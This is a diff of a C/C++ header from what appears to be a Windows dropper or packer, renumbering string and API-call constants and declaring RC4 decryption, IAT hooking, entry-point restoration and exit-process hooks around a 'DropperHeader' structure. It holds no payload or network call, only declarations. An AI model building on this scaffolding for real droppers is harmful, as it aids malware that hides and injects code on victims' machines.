@@ -22,34 +22,36 @@ enum {
 #define STRIDX_TMP_ENVVAR		1
 #define STRIDX_TEMP_ENVVAR		2
 #define STRIDX_KERNEL32_DLL     3
-#define STRIDX_MSVCRT_DLL		4
-#define STRIDX_LOADLIBRARYA		5
-#define STRIDX_GETPROCADDRESS	6
-#define STRIDX_RUNDLL			7
-#define STRIDX_COMMAHFF8		8
-#define STRIDX_HFF5				9
-#define STRIDX_DIRSEP			10
-#define STRIDX_USER32_DLL		11
+#define STRIDX_NTDLL_DLL		4
+#define STRIDX_MSVCRT_DLL		5
+#define STRIDX_LOADLIBRARYA		6
+#define STRIDX_GETPROCADDRESS	7
+#define STRIDX_RUNDLL			8
+#define STRIDX_COMMAHFF8		9
+#define STRIDX_HFF5				10
+#define STRIDX_DIRSEP			11
+#define STRIDX_USER32_DLL		12
+#define STRIDX_RTLEXITUSERPROCESS 13
 
 #if _DEBUG
-#define STRIDX_ERRORCREDIR		12
-#define STRIDX_EXITPROCIDX		13
-#define STRIDX_EXITPROCHOOKED   14
-#define STRIDX_RESTOREOEP		15
-#define STRIDX_EXITHOOKED		16
-#define STRIDX_OEPRESTORED		17
-#define STRIDX_CALLINGOEP		18
-#define STRIDX_CREATEFILE_ERR   19
-#define STRIDX_HFF5CALLING      20
-#define STRIDX_HFF5CALLED	    21
-#define STRIDX_INEXITPROC_HOOK  22
-#define STRIDX_VECTORQUIT		23
-#define STRIDX_VERIFYVERSION    24
-#define STRIDX_SYSMAJORVER		25
-#define STRIDX_SYSMINORVER		26
-#define STRIDX_RESTORESTAGE1	27
-#define STRIDX_RESTORESTAGE2	28
-#define STRIDX_UNCOMPRESS_ERR   29
+#define STRIDX_ERRORCREDIR		14
+#define STRIDX_EXITPROCIDX		15
+#define STRIDX_EXITPROCHOOKED   16
+#define STRIDX_RESTOREOEP		17
+#define STRIDX_EXITHOOKED		18
+#define STRIDX_OEPRESTORED		19
+#define STRIDX_CALLINGOEP		20
+#define STRIDX_CREATEFILE_ERR   21
+#define STRIDX_HFF5CALLING      22
+#define STRIDX_HFF5CALLED	    23
+#define STRIDX_INEXITPROC_HOOK  24
+#define STRIDX_VECTORQUIT		25
+#define STRIDX_VERIFYVERSION    26
+#define STRIDX_SYSMAJORVER		27
+#define STRIDX_SYSMINORVER		28
+#define STRIDX_RESTORESTAGE1	29
+#define STRIDX_RESTORESTAGE2	30
+#define STRIDX_UNCOMPRESS_ERR   31
 #endif
 
 #pragma endregion
@@ -89,14 +91,15 @@ enum {
 #define CALL_VIRTUALQUERY				27
 #define CALL_VERIFYVERSIONINFO			28
 #define CALL_GETVERSIONEX				29
-
+#define CALL_GETMODULEHANDLE			30
+#define CALL_RTLEXITUSERPROCESS			31
 // MSVCRT.dll
-#define CALL_SPRINTF					30
-#define CALL_EXIT						31
-#define CALL__EXIT						32
+#define CALL_SPRINTF					32
+#define CALL_EXIT						33
+#define CALL__EXIT						34
 
 // ADVAPI32.DLL
-#define CALL_GETCURRENTHWPROFILE		33
+#define CALL_GETCURRENTHWPROFILE		35
 
 #pragma endregion
 
@@ -284,17 +287,22 @@ typedef BOOL (*GETCURRENTHWPROFILE)(
 									LPHW_PROFILE_INFO lpHwProfileInfo
 									);
 
+typedef HMODULE (*GETMODULEHANDLE)(LPCTSTR);
+
 typedef void (*HFF5)(CHAR*, DWORD, STARTUPINFO*, PROCESS_INFORMATION*);
 
 typedef void (*RC4_SKIP)(const unsigned char *key, size_t keylen, size_t skip,
 						 unsigned char *data, size_t data_len, DropperHeader *header);
 
-typedef DWORD (*HOOKCALL)(char* dll, 
-				 int index, 
+
+typedef DWORD (*HOOKCALL)(char *dll, 
+				 char *name, 
 				 DWORD hookFunc, 
 				 UINT_PTR IAT_rva, 
 				 DWORD imageBase, 
 				 DropperHeader *header); 
+
+
 
 #pragma endregion
 
@@ -341,7 +349,7 @@ void arc4(const unsigned char *key, size_t keylen, size_t skip,
 			  unsigned char *data, size_t data_len, DropperHeader *header);
 FUNCTION_END_DECL(arc4);
 
-DWORD HookCall(char* dll, int index, DWORD hookFunc, UINT_PTR IAT_rva, DWORD imageBase, DropperHeader *header); 
+DWORD HookCall(char* dll, char* name, DWORD hookFunc, UINT_PTR IAT_rva, DWORD imageBase, DropperHeader *header); 
 FUNCTION_END_DECL(HookCall);
 
 void generate_key(std::string& key, unsigned int length);
